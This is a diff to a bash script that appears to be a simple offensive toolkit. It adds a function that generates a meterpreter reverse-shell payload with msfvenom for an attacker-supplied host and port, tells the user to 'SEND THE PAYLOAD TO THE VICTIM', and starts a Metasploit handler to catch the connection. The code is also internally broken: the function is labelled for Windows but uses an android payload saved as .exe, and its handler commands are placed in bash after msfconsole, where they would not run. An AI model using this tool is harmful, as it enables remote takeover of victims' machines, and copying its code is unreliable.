@@ -50,14 +50,24 @@ function nmapscan() {
         nmap -sT $network
 }
 
-#Funcion shell reversa con meterpreter
+#Function reverse shell with meterpreter for Windows
 function winrev() {
 	PAYLOAD="android/meterpreter/reverse_tcp"
 	read -p $'\e[1;92mInput your ip\e[0m \n' HOST
 	read -p $'\e[1;92mInput your port for forward\e[0m \n' PORT
 	read -p $'\e[1;92mInput the directory to save payload\e[0m \n'	DIR
 	msfvenom -p $PAYLOAD LHOST=$HOST LPORT=$PORT R> $DIR/payload.exe
-
+	printf "\e[1;31mSEND THE PAYLOAD TO THE VICTIM\e[0m \n"
+	#Activate listener for the winreverse payload
+	msfconsole
+	sleep 6s
+	EXPLOIT="exploit/multi/handler"
+	use EXPLOIT $EXPLOIT
+	set PAYLOAD $PAYLOAD
+	set LHOST $HOST
+	set LPORT $PORT
+	show options
+	run
 }
 
 #Banner
